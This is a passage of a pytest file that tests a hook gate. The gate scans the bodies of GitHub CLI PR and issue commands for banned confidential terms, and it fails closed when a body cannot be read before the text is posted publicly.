        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        cmd = "printf '%s' 'a perfectly clean pr body' | gh pr create --title t --body-file -"
        assert self._deny(cmd, repo, capsys) is None

    def test_piped_printf_gh_banned_term_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # ANTI-VACUITY: the piped writer's body is scanned, so a banned term blocks.
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        cmd = "printf '%s' 'ship acmecorp today' | gh pr create --title t --body-file -"
        reason = self._deny(cmd, repo, capsys)
        assert reason is not None
        assert "banned term 'acmecorp'" in reason

    def test_opaque_stdin_gh_post_stays_hard_blocked(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # A genuinely-opaque stdin (no heredoc, no printf/echo writer) feeding a
        # PUBLIC gh post is unreadable at scan time — it stays hard-blocked (a
        # public post never downgrades the way a local commit does).
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        reason = self._deny("cat body.txt | gh pr create --title t --body-file -", repo, capsys)
        assert reason is not None
        assert "could not be read" in reason


class TestAbsoluteBodyFileResolvesRegardlessOfCwd:
    """An absolute ``--body-file`` written by a prior step is read at scan time (#2369 case 1).

    The cold PreToolUse hook subprocess's cwd has often reset away from the
    worktree, but an ABSOLUTE path is cwd-independent, so the gate reads and
    scans the real body. A clean absolute body file PASSES; the same flag with a
    banned term in the file still BLOCKS (the read does not weaken the scan).
    """

    def _run_from_cwd(self, cwd: Path, command: str) -> bool:
        return handle_banned_terms_pretool({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": str(cwd)})

    def test_clean_absolute_body_file_passes_from_reset_cwd(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        body_file = tmp_path / "issue_body.md"
        body_file.write_text("A perfectly clean issue body.\n", encoding="utf-8")
        monkeypatch.chdir(tmp_path.parent)
        blocked = self._run_from_cwd(
            tmp_path.parent, f"gh issue create --repo someone/public --title t --body-file {body_file}"
        )
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_banned_absolute_body_file_still_blocks(self, tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
        body_file = tmp_path / "issue_body.md"
        body_file.write_text("This affects acmecorp's deployment.\n", encoding="utf-8")
        blocked = self._run_from_cwd(
            tmp_path, f"gh issue create --repo someone/public --title t --body-file {body_file}"
        )
        assert blocked is True
        decision = json.loads(capsys.readouterr().out)
        assert decision["permissionDecision"] == "deny"
        assert "acmecorp" in decision["permissionDecisionReason"]


class TestUnavailableBodySourceMessage:
    """``$VAR`` / stdin bodies fail closed with an ACTIONABLE message (#2369 cases 2/3).

    The body comes from an unexpanded variable or a stdin stream, neither of
    which the gate can read before the command runs. The block direction is
    preserved (an unscanned body must not publish), but the message is the
    actionable "write the body to an absolute file and use --body-file" rather
    than the misleading "the body file is missing" one.
    """

    def _reason(self, capsys: pytest.CaptureFixture[str]) -> str:
        return json.loads(capsys.readouterr().out)["permissionDecisionReason"]

    def test_unexpanded_var_body_yields_unavailable_marker(self) -> None:
        cmd = 'gh pr create --repo o/r --title t --body "$PR_BODY_ABSENT"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert banned_terms_scanner.scan_text(payload) == banned_terms_scanner.UNAVAILABLE_BODY_SOURCE_MARKER

    def test_stdin_input_body_yields_unavailable_marker(self) -> None:
        cmd = "gh api repos/o/r/issues -X POST --input -"
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert banned_terms_scanner.scan_text(payload) == banned_terms_scanner.UNAVAILABLE_BODY_SOURCE_MARKER

    def test_unexpanded_var_body_blocks_with_actionable_message(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(
            _bash('gh pr create --repo someone/public --title t --body "$PR_BODY_ABSENT"')
        )
        assert blocked is True
        reason = self._reason(capsys)
        assert "unexpanded variable or stdin" in reason
        assert "--body-file <abspath>" in reason
        # The block is preserved but the misleading missing-file advice is gone.
        assert "the body file is missing" not in reason

    def test_stdin_body_blocks_with_actionable_message(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(_bash("gh api repos/someone/public/issues -X POST --input -"))
        assert blocked is True
        reason = self._reason(capsys)
        assert "unexpanded variable or stdin" in reason
        assert "--body-file <abspath>" in reason

    def test_message_differs_from_missing_file_message(self) -> None:
        # The two body-unavailable classes render DISTINCT, non-empty messages so
        # the agent is told the right next step for each.
        unavailable = format_unavailable_body_source_message()
        missing_file = banned_terms_scanner.format_unresolvable_body_message()
        assert unavailable != missing_file
        assert "unexpanded variable or stdin" in unavailable
        assert "the body file is missing" not in unavailable

    def test_unavailable_marker_still_fails_closed_on_public_surface(self, capsys: pytest.CaptureFixture[str]) -> None:
        # CONTROL: the gate must NOT weaken — an unavailable body source on a
        # public surface STILL denies (never silently allows the unscanned post).
        blocked = handle_banned_terms_pretool(
            _bash('gh issue create --repo someone/public --title t --body "$BODY_NOT_SET"')
        )
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_unavailable_marker_downgrades_on_private_destination(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # Destination-aware parity with the missing-file marker: a $VAR body
        # posted to a provably-private target is not a public leak, so it
        # downgrades to a warn rather than hard-blocking.
        blocked = handle_banned_terms_pretool(
            _bash('gh issue create -R internalcorp/svc --title t --body "$BODY_NOT_SET"')
        )
        assert blocked is False


class TestSentinelRecognition:
    """``is_fail_closed_sentinel`` recognises BOTH sentinel spellings (#2369).

    Every downstream gate (quote-scanner, AI-signature, banned-terms) keeps
    failing closed regardless of which body-source class injected the sentinel,
    while ``is_unavailable_body_source_sentinel`` distinguishes the $VAR/stdin
    class so the gate can render the right operator advice.
    """

    def test_generic_sentinel_line_is_fail_closed(self) -> None:
        assert _command_parser.is_fail_closed_sentinel(FAIL_CLOSED_SENTINEL)
        assert not is_unavailable_body_source_sentinel(FAIL_CLOSED_SENTINEL)

    def test_unavailable_sentinel_line_is_both(self) -> None:
        assert _command_parser.is_fail_closed_sentinel(UNAVAILABLE_BODY_SOURCE_SENTINEL)
        assert is_unavailable_body_source_sentinel(UNAVAILABLE_BODY_SOURCE_SENTINEL)

    def test_unavailable_sentinel_as_one_joined_line_is_recognised(self) -> None:
        payload = f"t\n{UNAVAILABLE_BODY_SOURCE_SENTINEL}"
        assert _command_parser.is_fail_closed_sentinel(payload)
        assert is_unavailable_body_source_sentinel(payload)

    def test_inert_prose_naming_either_sentinel_mid_line_is_not_a_match(self) -> None:
        prose = f"the gate emits the {UNAVAILABLE_BODY_SOURCE_SENTINEL} marker when unavailable"
        assert not _command_parser.is_fail_closed_sentinel(prose)
        assert not is_unavailable_body_source_sentinel(prose)

    def test_clean_text_is_neither_sentinel(self) -> None:
        assert not _command_parser.is_fail_closed_sentinel("a normal clean body")
        assert not is_unavailable_body_source_sentinel("a normal clean body")
